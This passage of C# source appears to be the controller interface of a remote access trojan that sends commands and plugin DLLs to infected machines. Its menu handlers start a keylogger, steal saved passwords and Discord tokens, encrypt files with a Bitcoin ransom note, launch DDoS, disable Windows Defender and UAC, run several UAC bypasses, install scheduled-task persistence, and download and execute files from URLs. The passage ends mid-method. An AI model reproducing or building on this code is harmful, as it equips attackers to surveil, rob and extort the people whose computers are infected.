	private void ChangeWallpaperToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "wallpaper";
				msgPack.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
				msgPack.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Logger.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormKeylogger)Application.OpenForms["keyLogger:" + clients.ID] == null)
				{
					FormKeylogger formKeylogger = new FormKeylogger();
					formKeylogger.Name = "keyLogger:" + clients.ID;
					formKeylogger.Text = "keyLogger:" + clients.ID;
					formKeylogger.F = this;
					formKeylogger.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Keylogger");
					formKeylogger.Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void StartToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			string text = Interaction.InputBox("Alert when process activive.", "Title 标题", "Uplay,QQ,Chrome,Edge,Word,Excel,PowerPoint,Epic,Steam");
			if (!string.IsNullOrEmpty(text))
			{
				lock (Server.Settings.LockReportWindowClients)
				{
					Server.Settings.ReportWindowClients.Clear();
					Server.Settings.ReportWindowClients = new List<Clients>();
				}
				Server.Settings.ReportWindow = true;
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "reportWindow";
				msgPack.ForcePathObject("Option").AsString = "run";
				msgPack.ForcePathObject("Title").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		try
		{
			Server.Settings.ReportWindow = false;
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "reportWindow";
			msgPack.ForcePathObject("Option").AsString = "stop";
			lock (Server.Settings.LockReportWindowClients)
			{
				foreach (Clients reportWindowClient in Server.Settings.ReportWindowClients)
				{
					ThreadPool.QueueUserWorkItem(reportWindowClient.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "close";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "restart";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void UpdateToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
				msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
				msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
				msgPack.ForcePathObject("Update").AsString = "true";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\SendFile.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					clients.LV.ForeColor = Color.Red;
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "uninstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			Clients[] selectedClients = GetSelectedClients();
			if (selectedClients.Length == 0)
			{
				Process.Start(Application.StartupPath);
				return;
			}
			Clients[] array = selectedClients;
			foreach (Clients clients in array)
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + clients.ID);
				if (Directory.Exists(text))
				{
					Process.Start(text);
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RebootToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
			msgPack.ForcePathObject("Option").AsString = "restart";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void ShutDownToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
			msgPack.ForcePathObject("Option").AsString = "shutdown";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void LogoutToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
			msgPack.ForcePathObject("Option").AsString = "logoff";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void BlockToolStripMenuItem_Click(object sender, EventArgs e)
	{
		using FormBlockClients formBlockClients = new FormBlockClients();
		formBlockClients.ShowDialog();
	}

	private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
	{
		notifyIcon1.Dispose();
		Environment.Exit(0);
	}

	private void FileSearchToolStripMenuItem_Click(object sender, EventArgs e)
	{
		using FormFileSearcher formFileSearcher = new FormFileSearcher();
		if (formFileSearcher.ShowDialog() == DialogResult.OK && listView1.SelectedItems.Count > 0)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fileSearcher";
			msgPack.ForcePathObject("SizeLimit").AsInteger = (long)formFileSearcher.numericUpDown1.Value * 1000 * 1000;
			msgPack.ForcePathObject("Extensions").AsString = formFileSearcher.txtExtnsions.Text;
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\FileSearcher.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				clients.LV.ForeColor = Color.Red;
				ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
			}
		}
	}

	private void InformationToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "information";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Information.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void dDOSToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.Items.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "dosAdd";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Miscellaneous.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
				formDOS.Show();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			string text = Interaction.InputBox("Message", "Message", "All your files have been encrypted. pay us 0.2 BITCOIN. Our address is 1234567890");
			if (!string.IsNullOrEmpty(text) && listView1.SelectedItems.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "encrypt";
				msgPack.ForcePathObject("Message").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Ransomware.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			string text = Interaction.InputBox("Password", "Password");
			if (!string.IsNullOrEmpty(text) && listView1.SelectedItems.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "decrypt";
				msgPack.ForcePathObject("Password").AsString = text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Ransomware.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DisableWDToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView1.SelectedItems.Count <= 0 || MessageBox.Show(this, "Only for Admin.", "Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) != DialogResult.Yes)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.SubItems[lv_admin.Index].Text == "Admin")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RecordToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormAudio)Application.OpenForms["Audio Recorder:" + clients.ID] == null)
				{
					FormAudio formAudio = new FormAudio();
					formAudio.Name = "Audio Recorder:" + clients.ID;
					formAudio.Text = "Audio Recorder:" + clients.ID;
					formAudio.F = this;
					formAudio.ParentClient = clients;
					formAudio.Client = clients;
					formAudio.Show();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void RunasToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "uac";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.SubItems[lv_admin.Index].Text != "Administrator")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SilentCleanupToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.SubItems[lv_admin.Index].Text != "Administrator")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SchtaskInstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "schtaskinstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void PasswordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			if (listView1.SelectedItems.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Recovery.dll");
				Clients[] selectedClients = GetSelectedClients();
				for (int i = 0; i < selectedClients.Length; i++)
				{
					ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack.Encode2Bytes());
				}
				new HandleLogs().Addmsg("Recovering...", Color.Black);
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DiscordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Discord.dll");
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack.Encode2Bytes());
			}
			new HandleLogs().Addmsg("Recovering Discord...", Color.Black);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void FodhelperToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass3";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.SubItems[lv_admin.Index].Text != "Administrator")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DisableUACToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView1.SelectedItems.Count <= 0 || MessageBox.Show(this, "Only for Admin.", "Disbale UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) != DialogResult.Yes)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.SubItems[lv_admin.Index].Text == "Admin")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void CompMgmtLauncherToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass2";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if (clients.LV.SubItems[lv_admin.Index].Text != "Administrator")
				{
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void DocumentToolStripMenuItem_Click(object sender, EventArgs e)
	{
	}

	private void SettingToolStripMenuItem_Click(object sender, EventArgs e)
	{
		using FormSetting formSetting = new FormSetting();
		formSetting.ShowDialog();
	}

	private void autoKeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes("bin\\Keylogger.exe")));
			msgPack.ForcePathObject("Inject").AsString = "";
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "Auto Keylogger:";
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\SendMemory.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			if (listView4.Items.Count > 0)
			{
				foreach (ListViewItem item in listView4.Items)
				{
					if (item.Text == listViewItem.Text)
					{
						return;
					}
				}
			}
			Program.form1.listView4.Items.Add(listViewItem);
			Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void SchtaskUninstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (listView1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "schtaskuninstall";
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void fakeBinderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "fakeBinder";
			msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
			msgPack.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\SendFile.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "FakeBinder: " + Path.GetFileName(openFileDialog.FileName);
			listViewItem.SubItems.Add("0");
			listViewItem.ToolTipText = Guid.NewGuid().ToString();
			if (listView4.Items.Count > 0)
			{
				foreach (ListViewItem item in listView4.Items)
				{
					if (item.Text == listViewItem.Text)
					{
						return;
					}
				}
			}
			Program.form1.listView4.Items.Add(listViewItem);
			Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, _admin: false));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void netstatToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Netstat.dll");
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				if ((FormNetstat)Application.OpenForms["Netstat:" + clients.ID] == null)
				{
					FormNetstat formNetstat = new FormNetstat();
					formNetstat.Name = "Netstat:" + clients.ID;
					formNetstat.Text = "Netstat:" + clients.ID;
					formNetstat.F = this;
					formNetstat.ParentClient = clients;
					formNetstat.Show();
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void fromUrlToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url");
		if (string.IsNullOrEmpty(text) || listView1.SelectedItems.Count <= 0)
		{
			return;
		}
		try
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
			msgPack.ForcePathObject("url").AsString = text;
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			for (int i = 0; i < selectedClients.Length; i++)
			{
				ThreadPool.QueueUserWorkItem(selectedClients[i].Send, msgPack2.Encode2Bytes());
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	private void sendFileFromUrlToolStripMenuItem_Click(object sender, EventArgs e)
	{
		try
		{
			string text = Interaction.InputBox("\nInput Url here.\n\nOnly for exe.", "Url");
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "downloadFromUrl";
			msgPack.ForcePathObject("url").AsString = text;
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "SendFileFromUrl: " + Path.GetFileName(text);
			listViewItem.SubItems.Add("0");
